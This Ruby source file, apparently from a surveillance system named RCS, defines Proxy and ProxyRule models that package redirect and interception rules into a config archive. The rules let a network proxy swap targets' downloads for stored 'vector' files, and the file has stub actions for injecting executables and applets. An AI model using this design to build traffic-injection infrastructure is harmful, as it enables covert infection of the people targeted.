require 'mongoid'
require 'tempfile'
require 'zip/zip'
require 'zip/zipfilesystem'

#module RCS
#module DB

class Proxy
  include RCS::Tracer
  include Mongoid::Document
  include Mongoid::Timestamps

  field :name, type: String
  field :desc, type: String
  field :address, type: String
  field :redirect, type: String
  field :port, type: Integer
  field :poll, type: Boolean
  field :version, type: Integer
  field :configured, type: Boolean
  field :redirection_tag, type: String

  store_in :proxies

  embeds_many :rules, class_name: "ProxyRule"

  after_destroy :drop_log_collection

  protected
  def drop_log_collection
    Mongoid.database.drop_collection CappedLog.collection_name(self._id.to_s)
  end

  public
  def config
    base = rand(10)
    progressive = 0
    redirect_user = {}
    redirect_url = []
    intercept_files = []
    vector_files = {}

    begin
      self.rules.each do |rule|

        next unless rule.enabled

        tag = self.redirection_tag + (base + progressive).to_s
        progressive += 1

        # use the key of the hash to avoid duplicates
        redirect_user["#{rule.ident} #{rule.ident_param}"] ||= tag

        redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"

        intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"

        case rule.action
          when 'REPLACE'
            vector_files[rule.action_param_name] = Tempfile.new('rule_replace')
            vector_files[rule.action_param_name].write RCS::DB::GridFS.get(rule[:_grid][0]).read
            vector_files[rule.action_param_name].flush
          when 'INJECT-EXE'
            # TODO: generate the agent
          when 'INJECT-HTML'
            # TODO: generate the applet
        end
      end

      file = Tempfile.new('proxyconfig')

      Zip::ZipOutputStream.open(file.path) do |z|
        z.put_next_entry("redirect_user.txt")
        redirect_user.each_pair do |key, value|
          z.puts "#{key} #{value}"
        end

        z.put_next_entry("redirect_url.txt")
        redirect_url.each do |value|
          z.puts value
        end

        z.put_next_entry("intercept_file.txt")
        intercept_files.each do |value|
          z.puts value
        end

        vector_files.each_pair do |filename, file|
          z.put_next_entry("vectors/" + filename)
          z.write File.open(file.path, 'rb') {|f| f.read}
        end
      end

      trace :info, "Proxy config file size: " + File.size(file.path).to_s
      
      return file.path
    rescue Exception => e
      trace :error, "Error generating the proxy config: #{e.message}"
      return nil
    end
  end

end


class ProxyRule
  include Mongoid::Document
  include Mongoid::Timestamps

  field :enabled, type: Boolean
  field :disable_sync, type: Boolean
  field :probability, type: Integer

  field :target_id, type: Array
  field :ident, type: String
  field :ident_param, type: String
  field :resource, type: String
  field :action, type: String
  field :action_param, type: String
  field :action_param_name, type: String

  field :_grid, type: Array

  embedded_in :proxy
end

#end # ::DB
#end # ::RCS